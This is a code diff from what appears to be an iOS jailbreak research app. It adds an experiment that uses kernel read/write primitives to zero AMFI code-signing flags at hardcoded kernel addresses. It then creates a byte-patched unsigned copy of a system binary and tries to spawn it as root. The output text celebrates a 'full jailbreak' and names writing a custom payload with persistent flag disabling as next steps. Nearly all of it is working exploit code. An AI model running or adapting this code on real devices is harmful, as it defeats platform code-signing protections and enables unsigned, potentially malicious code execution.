@@ -874,6 +874,16 @@ struct AMFIExperimentView: View {
                 )
 
                 pathButton(
+                    title: "③o3 AMFI Verified Spawn (Exp 93c)",
+                    icon: "checkmark.shield.fill",
+                    color: .red,
+                    label: "AMFI Verify",
+                    action: runExp93cVerifiedSpawn,
+                    needsVerified: true,
+                    needsProbe: false
+                )
+
+                pathButton(
                     title: "③p Heap TC Scan (Exp 94)",
                     icon: "magnifyingglass.circle",
                     color: .orange,
@@ -7177,6 +7187,442 @@ struct AMFIExperimentView: View {
         }
 
         return ExperimentResult(name: expName, success: spawnSuccess, detail: detail, timestamp: Date())
+    }
+
+    // MARK: - Exp 93c: AMFI Disable + Verified Spawn + Unsigned Binary
+
+    /// Exp 93c: Definitive test — disable AMFI flags, verify paths exist, capture stdout,
+    /// AND test spawning a COPIED binary (not in trust cache = different CDHash).
+    private func runExp93cVerifiedSpawn() {
+        isRunning = true
+        runningLabel = "AMFI Verify"
+        guard mgr.dsready, PhysmapConstants.isVerified else {
+            isRunning = false
+            runningLabel = ""
+            return
+        }
+        #if !DISABLE_REMOTECALL
+        root.executeAsRoot(operation: "exp93c_verified_spawn") { rc in
+            let result = self.expAMFIVerifiedSpawn(rc: rc)
+            DispatchQueue.main.async {
+                self.results.insert(result, at: 0)
+                self.isRunning = false
+                self.runningLabel = ""
+            }
+            return (result.success, result.detail.prefix(80).description, 0)
+        }
+        #else
+        isRunning = false
+        runningLabel = ""
+        #endif
+    }
+
+    private func expAMFIVerifiedSpawn(rc: RemoteCall) -> ExperimentResult {
+        let expName = "AMFI Verified Spawn (Exp 93c)"
+        var detail = "Experiment 93c: Verified Spawn + Unsigned Binary\n"
+        detail += "==================================================\n\n"
+
+        let kernBase = ds_get_kernel_base()
+        let slide = kernBase - 0xfffffff007004000
+        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
+        detail += "KASLR slide: 0x\(String(format: "%llx", slide))\n\n"
+
+        let amfiDataSlid = UInt64(0xfffffff00a330098) &+ slide
+        let flagOffsets: [UInt64] = [0x110, 0x160, 0x1b0, 0x200, 0x250, 0x2a0, 0x2f0, 0x340, 0x398, 0x408]
+        let mem = rc.trojanMem
+
+        // ============================================================
+        // Step 0: Verify binary paths exist BEFORE disabling flags
+        // ============================================================
+        detail += "=== Step 0: Verify paths exist ===\n"
+
+        let testPaths = ["/usr/bin/id", "/bin/ls", "/bin/sh", "/usr/bin/uname"]
+        var validPath: String? = nil
+
+        for path in testPaths {
+            let pathAddr = remote_alloc_str(rc, path)
+            // access(path, F_OK) — F_OK = 0
+            let ret = RootExecutor.rcall(rc, "access", pathAddr, 0)
+            detail += "  access(\(path)): \(ret == 0 ? "EXISTS ✅" : "NOT FOUND ❌ (ret=\(ret))")\n"
+            if ret == 0 && validPath == nil {
+                validPath = path
+            }
+            RootExecutor.rcall(rc, "free", pathAddr)
+        }
+        detail += "\n"
+
+        guard let spawnPath = validPath else {
+            detail += "❌ No valid binary path found! Cannot proceed.\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+        detail += "Using: \(spawnPath)\n\n"
+
+        // ============================================================
+        // Step 1: Create unsigned binary (copy + modify = new CDHash)
+        // ============================================================
+        detail += "=== Step 1: Create unsigned test binary ===\n"
+
+        let srcPathStr = spawnPath
+        let dstPathStr = "/var/tmp/.exp93c_test"
+        let srcPath = remote_alloc_str(rc, srcPathStr)
+        let dstPath = remote_alloc_str(rc, dstPathStr)
+
+        // Remove old copy
+        RootExecutor.rcall(rc, "unlink", dstPath)
+
+        // Open source
+        let srcFd = RootExecutor.rcall(rc, "open", srcPath, UInt64(O_RDONLY), 0)
+        guard srcFd != UInt64(bitPattern: -1) else {
+            detail += "❌ Cannot open \(srcPathStr)\n"
+            RootExecutor.rcall(rc, "free", srcPath)
+            RootExecutor.rcall(rc, "free", dstPath)
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        // Open dest
+        let dstFd = RootExecutor.rcall(rc, "open", dstPath, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
+        guard dstFd != UInt64(bitPattern: -1) else {
+            detail += "❌ Cannot create \(dstPathStr)\n"
+            RootExecutor.rcall(rc, "close", srcFd)
+            RootExecutor.rcall(rc, "free", srcPath)
+            RootExecutor.rcall(rc, "free", dstPath)
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        // Copy file
+        let buf = mem + 0x800
+        var totalCopied: UInt64 = 0
+        for _ in 0..<512 {  // max 512 * 4096 = 2MB
+            let nread = RootExecutor.rcall(rc, "read", srcFd, buf, 4096)
+            if nread == 0 || nread == UInt64(bitPattern: -1) { break }
+            RootExecutor.rcall(rc, "write", dstFd, buf, nread)
+            totalCopied += nread
+            if nread < 4096 { break }
+        }
+        RootExecutor.rcall(rc, "close", srcFd)
+        RootExecutor.rcall(rc, "close", dstFd)
+
+        detail += "Copied \(srcPathStr) → \(dstPathStr) (\(totalCopied) bytes)\n"
+
+        // Patch 1 byte to invalidate CDHash (change padding byte near end of Mach-O header)
+        let patchFd = RootExecutor.rcall(rc, "open", dstPath, UInt64(O_RDWR), 0)
+        if patchFd != UInt64(bitPattern: -1) {
+            // Seek to offset 0x10 (padding area in mach_header_64) and flip a bit
+            RootExecutor.rcall(rc, "lseek", patchFd, 0x10, 0)  // SEEK_SET
+            rc[buf].setValue8(0x42)  // arbitrary byte
+            RootExecutor.rcall(rc, "write", patchFd, buf, 1)
+            RootExecutor.rcall(rc, "close", patchFd)
+            detail += "Patched byte at offset 0x10 → CDHash now INVALID\n"
+        }
+
+        // chmod +x
+        RootExecutor.rcall(rc, "chmod", dstPath, 0o755)
+        detail += "chmod 755 done\n\n"
+
+        // Verify unsigned binary exists
+        let accessUnsigned = RootExecutor.rcall(rc, "access", dstPath, 0)
+        detail += "access(\(dstPathStr)): \(accessUnsigned == 0 ? "EXISTS ✅" : "FAIL ❌")\n\n"
+
+        // ============================================================
+        // Step 2: BASELINE — try spawn WITHOUT disabling flags
+        // ============================================================
+        detail += "=== Step 2: Baseline (flags ENABLED) ===\n"
+
+        // Test A: spawn original binary (should work — it's in trust cache)
+        detail += "--- Spawn original \(spawnPath) (trusted) ---\n"
+        let baselineResult = spawnAndCapture(rc: rc, binaryPath: spawnPath, mem: mem)
+        detail += baselineResult.log
+        detail += "\n"
+
+        // Test B: spawn unsigned copy (should FAIL — not in trust cache)
+        detail += "--- Spawn \(dstPathStr) (unsigned) ---\n"
+        let baselineUnsigned = spawnAndCapture(rc: rc, binaryPath: dstPathStr, mem: mem)
+        detail += baselineUnsigned.log
+        detail += "\n"
+
+        // ============================================================
+        // Step 3: Disable ALL AMFI flags
+        // ============================================================
+        detail += "=== Step 3: Disable AMFI flags ===\n"
+
+        var originalValues: [(offset: UInt64, value: UInt64)] = []
+        for off in flagOffsets {
+            let addr = amfiDataSlid &+ off
+            let val = ds_kread64_safe(addr)
+            originalValues.append((off, val))
+            ds_kwrite64(addr, 0)
+        }
+
+        // Verify all disabled
+        var allDisabled = true
+        for off in flagOffsets {
+            let readback = ds_kread64_safe(amfiDataSlid &+ off)
+            if readback != 0 { allDisabled = false }
+        }
+        detail += "Flags disabled: \(allDisabled ? "10/10 ✅" : "PARTIAL ❌")\n\n"
+
+        guard allDisabled else {
+            for (off, origVal) in originalValues { ds_kwrite64(amfiDataSlid &+ off, origVal) }
+            detail += "❌ Could not disable all flags\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        // ============================================================
+        // Step 4: Test spawns WITH flags disabled
+        // ============================================================
+        detail += "=== Step 4: Spawn tests (flags DISABLED) ===\n\n"
+
+        // Test A: spawn original (trusted) binary with stdout capture
+        detail += "--- [A] Spawn \(spawnPath) (trusted, flags off) ---\n"
+        let testA = spawnAndCapture(rc: rc, binaryPath: spawnPath, mem: mem)
+        detail += testA.log
+        detail += "\n"
+
+        // Test B: spawn UNSIGNED binary (the critical test!)
+        detail += "--- [B] Spawn \(dstPathStr) (UNSIGNED, flags off) ---\n"
+        let testB = spawnAndCapture(rc: rc, binaryPath: dstPathStr, mem: mem)
+        detail += testB.log
+        detail += "\n"
+
+        // Test C: fork + execve unsigned binary
+        detail += "--- [C] fork+execve \(dstPathStr) (UNSIGNED, flags off) ---\n"
+        let testC = forkExecAndCapture(rc: rc, binaryPath: dstPathStr, mem: mem)
+        detail += testC.log
+        detail += "\n"
+
+        // Test D: fork + execve original binary
+        detail += "--- [D] fork+execve \(spawnPath) (trusted, flags off) ---\n"
+        let testD = forkExecAndCapture(rc: rc, binaryPath: spawnPath, mem: mem)
+        detail += testD.log
+        detail += "\n"
+
+        // ============================================================
+        // Step 5: Restore flags
+        // ============================================================
+        detail += "=== Step 5: Restore AMFI flags ===\n"
+        for (off, origVal) in originalValues {
+            ds_kwrite64(amfiDataSlid &+ off, origVal)
+        }
+        detail += "All flags restored to 1\n\n"
+
+        // Cleanup
+        RootExecutor.rcall(rc, "unlink", dstPath)
+        RootExecutor.rcall(rc, "free", srcPath)
+        RootExecutor.rcall(rc, "free", dstPath)
+
+        // ============================================================
+        // VERDICT
+        // ============================================================
+        detail += "=== VERDICT ===\n\n"
+
+        let unsignedSpawnOK = testB.success || testC.success
+        let trustedSpawnOK = testA.success || testD.success
+
+        if unsignedSpawnOK {
+            detail += "🎉🎉🎉 UNSIGNED BINARY EXECUTED! FULL JAILBREAK! 🎉🎉🎉\n\n"
+            detail += "AMFI flags control CDHash enforcement!\n"
+            detail += "Unsigned binary ran successfully with flags disabled!\n\n"
+            detail += "=== NEXT STEPS ===\n"
+            detail += "1. Binary search which flag(s) are needed\n"
+            detail += "2. Write custom payload binary\n"
+            detail += "3. Keep flags disabled for persistent execution\n"
+        } else if trustedSpawnOK && !baselineResult.success {
+            detail += "⚠️ PARTIAL SUCCESS: trusted binary now spawns (was failing before)\n"
+            detail += "AMFI flags affect spawn but unsigned still blocked.\n"
+            detail += "CDHash validation might be in pmap_cs (PPL), not AMFI.\n\n"
+            detail += "Flags help with posix_spawn path resolution but not CDHash.\n"
+        } else if testD.success && !testC.success {
+            detail += "⚠️ fork+execve works for TRUSTED but not UNSIGNED.\n"
+            detail += "AMFI flags don't bypass CDHash validation.\n"
+            detail += "Trust cache lookup still active (PPL-level).\n"
+        } else {
+            detail += "❌ No improvement with flags disabled.\n"
+            detail += "Baseline trusted: \(baselineResult.success), After: \(testA.success)\n"
+            detail += "Baseline unsigned: \(baselineUnsigned.success), After: \(testB.success)\n\n"
+            detail += "These flags likely control logging/telemetry only.\n"
+        }
+
+        return ExperimentResult(name: expName, success: unsignedSpawnOK, detail: detail, timestamp: Date())
+    }
+
+    // MARK: - Exp 93c Helpers
+
+    private struct SpawnResult {
+        let success: Bool
+        let log: String
+        let exitCode: Int32
+        let signal: Int32
+        let stdout: String
+    }
+
+    /// posix_spawn with pipe to capture stdout
+    private func spawnAndCapture(rc: RemoteCall, binaryPath: String, mem: UInt64) -> SpawnResult {
+        var log = ""
+        let binAddr = remote_alloc_str(rc, binaryPath)
+
+        // Create pipe for stdout capture
+        let pipeFds = mem + 0x600  // [read_fd, write_fd]
+        rc[pipeFds].setValue32(0)
+        rc[pipeFds + 4].setValue32(0)
+        let pipeRet = RootExecutor.rcall(rc, "pipe", pipeFds)
+
+        let readFd = Int32(bitPattern: rc[pipeFds].value32())
+        let writeFd = Int32(bitPattern: rc[pipeFds + 4].value32())
+
+        if pipeRet != 0 {
+            log += "  pipe() failed, falling back to simple spawn\n"
+            // Fallback: simple spawn without capture
+            let argvBase = mem + 0x500
+            rc[argvBase].setValue64(binAddr)
+            rc[argvBase + 8].setValue64(0)
+            let pidAddr = mem + 0x480
+            rc[pidAddr].setValue32(0)
+
+            let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, 0, 0, argvBase, 0)
+            let pid = rc[pidAddr].value32()
+            log += "  posix_spawn: ret=\(ret), pid=\(pid)\n"
+
+            if ret == 0 && pid != 0 {
+                let statusAddr = mem + 0x490
+                rc[statusAddr].setValue32(0)
+                RootExecutor.rcall(rc, "waitpid", UInt64(pid), statusAddr, 0)
+                let st = rc[statusAddr].value32()
+                let sig = Int32(st & 0x7F)
+                let code = Int32(st >> 8)
+                log += "  exit: signal=\(sig), code=\(code)\n"
+                RootExecutor.rcall(rc, "free", binAddr)
+                return SpawnResult(success: sig != 9 && sig == 0, log: log, exitCode: code, signal: sig, stdout: "")
+            } else {
+                let err = remote_errno(rc)
+                log += "  FAILED: errno=\(err)\n"
+                RootExecutor.rcall(rc, "free", binAddr)
+                return SpawnResult(success: false, log: log, exitCode: -1, signal: -1, stdout: "")
+            }
+        }
+
+        // Setup posix_spawn_file_actions to redirect stdout to pipe
+        // posix_spawn_file_actions_t is opaque — size varies, allocate 128 bytes
+        let fileActionsAddr = mem + 0x650
+        let initRet = RootExecutor.rcall(rc, "posix_spawn_file_actions_init", fileActionsAddr)
+
+        if initRet == 0 {
+            // dup2 write end of pipe to stdout (fd 1)
+            RootExecutor.rcall(rc, "posix_spawn_file_actions_adddup2", fileActionsAddr, UInt64(Int64(writeFd)), 1)
+            // Also redirect stderr to pipe
+            RootExecutor.rcall(rc, "posix_spawn_file_actions_adddup2", fileActionsAddr, UInt64(Int64(writeFd)), 2)
+            // Close read end in child
+            RootExecutor.rcall(rc, "posix_spawn_file_actions_addclose", fileActionsAddr, UInt64(Int64(readFd)))
+        }
+
+        // argv = [binary, NULL]
+        let argvBase = mem + 0x500
+        rc[argvBase].setValue64(binAddr)
+        rc[argvBase + 8].setValue64(0)
+
+        // Spawn
+        let pidAddr = mem + 0x480
+        rc[pidAddr].setValue32(0)
+        let spawnRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr,
+                                          initRet == 0 ? fileActionsAddr : 0, 0, argvBase, 0)
+        let pid = rc[pidAddr].value32()
+
+        log += "  posix_spawn: ret=\(spawnRet), pid=\(pid)\n"
+
+        // Close write end in parent (so read gets EOF when child exits)
+        RootExecutor.rcall(rc, "close", UInt64(Int64(writeFd)))
+
+        var stdoutStr = ""
+        if spawnRet == 0 && pid != 0 {
+            // Read stdout from pipe (max 1024 bytes)
+            let readBuf = mem + 0x1000
+            let nread = RootExecutor.rcall(rc, "read", UInt64(Int64(readFd)), readBuf, 1024)
+            if nread > 0 && nread < 1024 {
+                // Read bytes from remote userspace memory via RC accessor
+                var bytes: [UInt8] = []
+                for i: UInt64 in 0..<min(nread, 256) {
+                    let b = rc[readBuf + i].value8()
+                    if b == 0 { break }
+                    bytes.append(b)
+                }
+                stdoutStr = String(bytes: bytes, encoding: .utf8) ?? "(binary data)"
+                log += "  stdout (\(nread) bytes): \(stdoutStr.prefix(200))\n"
+            } else if nread == 0 {
+                log += "  stdout: (empty)\n"
+            }
+
+            // Wait for child
+            let statusAddr = mem + 0x490
+            rc[statusAddr].setValue32(0)
+            RootExecutor.rcall(rc, "waitpid", UInt64(pid), statusAddr, 0)
+            let st = rc[statusAddr].value32()
+            let sig = Int32(st & 0x7F)
+            let code = Int32(st >> 8)
+            log += "  exit: signal=\(sig), code=\(code)\n"
+
+            RootExecutor.rcall(rc, "close", UInt64(Int64(readFd)))
+            if initRet == 0 { RootExecutor.rcall(rc, "posix_spawn_file_actions_destroy", fileActionsAddr) }
+            RootExecutor.rcall(rc, "free", binAddr)
+
+            let ok = (sig != 9 && sig == 0)
+            if sig == 9 { log += "  ❌ SIGKILL by AMFI\n" }
+            else if ok { log += "  ✅ SUCCESS\n" }
+            return SpawnResult(success: ok, log: log, exitCode: code, signal: sig, stdout: stdoutStr)
+        } else {
+            let err = remote_errno(rc)
+            log += "  FAILED: errno=\(err)\n"
+            RootExecutor.rcall(rc, "close", UInt64(Int64(readFd)))
+            if initRet == 0 { RootExecutor.rcall(rc, "posix_spawn_file_actions_destroy", fileActionsAddr) }
+            RootExecutor.rcall(rc, "free", binAddr)
+            return SpawnResult(success: false, log: log, exitCode: -1, signal: -1, stdout: "")
+        }
+    }
+
+    /// fork + execve with waitpid
+    private func forkExecAndCapture(rc: RemoteCall, binaryPath: String, mem: UInt64) -> SpawnResult {
+        var log = ""
+        let binAddr = remote_alloc_str(rc, binaryPath)
+        let argvBase = mem + 0x500
+        rc[argvBase].setValue64(binAddr)
+        rc[argvBase + 8].setValue64(0)
+
+        let childPid = RootExecutor.rcall(rc, "fork")
+        log += "  fork() = \(childPid)\n"
+
+        if childPid == 0 {
+            // Child process — execve
+            RootExecutor.rcall(rc, "execve", binAddr, argvBase, 0)
+            RootExecutor.rcall(rc, "_exit", 127)
+            RootExecutor.rcall(rc, "free", binAddr)
+            return SpawnResult(success: false, log: log + "  (in child, execve returned)\n", exitCode: 127, signal: 0, stdout: "")
+        } else if childPid != UInt64(bitPattern: -1) {
+            // Parent — wait for child
+            let statusAddr = mem + 0x490
+            rc[statusAddr].setValue32(0)
+            RootExecutor.rcall(rc, "waitpid", childPid, statusAddr, 0)
+            let st = rc[statusAddr].value32()
+            let sig = Int32(st & 0x7F)
+            let code = Int32(st >> 8)
+
+            log += "  child exit: signal=\(sig), code=\(code)\n"
+
+            RootExecutor.rcall(rc, "free", binAddr)
+
+            if sig == 9 {
+                log += "  ❌ SIGKILL by AMFI\n"
+                return SpawnResult(success: false, log: log, exitCode: code, signal: sig, stdout: "")
+            } else if sig == 0 && code != 127 {
+                log += "  ✅ execve SUCCESS\n"
+                return SpawnResult(success: true, log: log, exitCode: code, signal: sig, stdout: "")
+            } else {
+                log += "  ⚠️ execve likely failed (code=127 means execve returned)\n"
+                return SpawnResult(success: false, log: log, exitCode: code, signal: sig, stdout: "")
+            }
+        } else {
+            let err = remote_errno(rc)
+            log += "  fork() FAILED: errno=\(err)\n"
+            RootExecutor.rcall(rc, "free", binAddr)
+            return SpawnResult(success: false, log: log, exitCode: -1, signal: -1, stdout: "")
+        }
     }
 
     // MARK: - Exp 94: Heap Trust Cache Scan
